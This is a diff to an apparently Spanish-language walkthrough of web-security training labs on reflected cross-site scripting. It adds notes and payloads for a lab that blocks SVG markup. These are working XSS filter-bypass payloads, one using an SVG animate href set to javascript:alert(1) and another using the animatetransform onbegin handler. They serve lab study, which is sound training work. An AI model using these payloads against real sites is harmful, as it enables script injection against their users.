@@ -278,6 +278,8 @@ Entonces vamos al home del laboratorio para verificar que lo completamos.
 
 ## 8. Lab: Reflected XSS with event handlers and href attributes blocked
 
+Payload
+
 ```
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 ```
@@ -285,6 +287,22 @@ Entonces vamos al home del laboratorio para verificar que lo completamos.
 ![](img28.png)
 
 ## 9. Lab: Reflected XSS with some SVG markup allowed
+
+```
+This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert() function.
+```
+
+Payload
+
+```html
+<svg><animatetransform onbegin=alert(1)>
+```
+
+![](img29.png)
+
+## 10. Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 
 
 
